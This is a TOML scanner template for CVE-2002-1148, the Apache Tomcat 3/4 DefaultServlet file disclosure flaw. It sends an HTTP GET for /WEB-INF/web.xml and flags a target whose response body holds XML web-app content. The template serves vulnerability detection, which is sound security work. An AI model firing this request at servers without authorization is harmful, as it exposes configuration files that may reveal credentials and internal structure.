[info]
author = "ave"
description = "验证 Apache Tomcat 3/4 DefaultServlet 文件泄漏漏洞，通过向 /WEB-INF/web.xml 发送直接 HTTP GET 请求，检测服务器是否允许未授权访问敏感配置文件。"
id = "POC-AVE-2002-0296"
name = "Apache Tomcat DefaultServlet File Disclosure PoC"
severity = "medium"
tags = ["ave-2002-0296"]
vuln_id = [
    "CVE-2002-1148",
    "AVE-2002-0296",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/WEB-INF/web.xml"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<?xml",
    "<web-app",
]
